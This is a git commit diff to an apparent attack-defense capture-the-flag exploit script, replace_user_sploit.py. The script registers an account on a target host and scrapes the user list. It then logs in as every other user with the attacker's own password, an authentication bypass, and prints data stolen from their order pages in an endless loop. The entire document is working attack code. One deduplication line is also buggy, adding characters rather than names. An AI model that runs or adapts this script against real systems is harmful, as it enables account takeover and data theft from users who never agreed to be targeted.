2926882973f639073ef9ed21066e8ac34f8848b4
cinsort <milkofhuk@gmail.com>
2022-04-16 13:13:48 +0700

    re- sploit

--- sploits/replace_user_sploit.py
+++ sploits/replace_user_sploit.py
@@ -9,28 +9,30 @@ old_users = []
 ip = sys.argv[1]
 host = f"http://{ip}:8084"
 s = requests.Session()
-user_name = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(15))
-password = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(15))
-r = s.post(
-  host + '/register',
-  data={
-    'user_name': password,
-    'password': user_name
-  })
-r = s.get(
-  host + '/users'
-)
-users = re.findall("\</p\>\<p style=\'margin: 4px 8px\'\>(.*?)\</p\>", r.text)
-for user in list(set(users).difference(old_users)):
-  r1 = s.post(
-    host + '/login',
-    data = {
-      'user_name': user,
-      'password': password
-    }
+while True:
+  user_name = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(15))
+  password = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(15))
+  r = s.post(
+    host + '/register',
+    data={
+      'user_name': password,
+      'password': user_name
+    })
+  r = s.get(
+    host + '/users'
   )
-  r1 = s.get(
-    host + "/myOrders"
-  )
-  flags = re.findall("\</p\>\<p style=\'margin: 4px 8px\'\>(.*?)\</p\>", r1.text)
-  print (flags,flush=True)
+  users = re.findall("\</p\>\<p style=\'margin: 4px 8px\'\>(.*?)\</p\>", r.text)
+  for user in list(set(users).difference(old_users)):
+    old_users.extend(user)
+    r1 = s.post(
+      host + '/login',
+      data = {
+        'user_name': user,
+        'password': password
+      }
+    )
+    r1 = s.get(
+      host + "/myOrders"
+    )
+    flags = re.findall("\</p\>\<p style=\'margin: 4px 8px\'\>(.*?)\</p\>", r1.text)
+    print (flags,flush=True)
